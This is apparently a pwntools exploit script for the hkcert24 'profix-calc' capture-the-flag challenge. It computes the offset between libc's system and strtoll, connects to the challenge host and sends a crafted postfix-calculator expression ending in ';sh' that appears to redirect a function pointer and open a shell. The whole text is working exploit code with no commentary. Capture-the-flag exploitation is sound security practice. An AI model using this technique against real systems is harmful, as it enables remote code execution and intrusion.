from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
system_addr  = libc.symbols['system']
strtoll_addr = libc.symbols['strtoll']

# r = process("env/chal/src/chal")
r = remote("c54-profix-calc.hkcert24.pwnable.hk", 1337, ssl=True)
r.recvuntil(b'expression(e.g. 9 6 - 11 *): ')
payload = b"* * * * * * * * + + * + + + 0 * " +str(system_addr-strtoll_addr).encode() + b" + + 0x;sh"
r.sendline(payload)
r.interactive()